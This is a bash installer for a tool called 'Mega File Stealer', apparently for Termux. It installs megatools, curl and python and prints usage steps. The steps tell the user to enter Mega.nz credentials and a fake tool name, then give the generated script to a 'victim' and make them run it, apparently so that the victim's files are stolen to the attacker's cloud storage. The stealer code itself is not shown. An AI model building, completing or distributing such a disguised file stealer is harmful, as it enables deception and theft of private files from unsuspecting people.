#!/bin/bash

echo -e "   _______________________________________"
echo -e "  |                                       |"
echo -e "  | \033[0;34mName\033[0;0m    : \033[0;36mMega File Stealer\033[0;0m           |"
echo -e "  | \033[0;34mVersion\033[0;0m : \033[0;36m2.0\033[0;0m                         |"
echo -e "  | \033[0;34mAuthor\033[0;0m  : \033[0;36mZech Bron\033[0;0m                   |"
echo -e "  | \033[0;34mGitHub\033[0;0m  : \033[0;36mhttps://github.com/ZechBron\033[0;0m |"
echo -e "  |_______________________________________|"
echo -e "\n"

pkg install megatools -y
pkg install curl -y
pkg install python -y
pip install --upgrade pip
chmod +x setup.sh
chmod +x update.sh

# Instruction
echo -e "\e[92mINSTRUCTION:\e[0m"
echo -e " 1. \e[32mCreate an account in Mega.nz\e[0m"
echo -e " 2. \e[32mRun my program by typing: python mega-file-stealer.py\e[0m"
echo -e " 3. \e[32mEnter your mega.nz username, email anf password. Then enter any fake tool name\e[0m"
echo -e " 4. \e[32mFind the tool that appear in your file manager, give it to your victim and make your victim run the script that you have gave\e[0m"
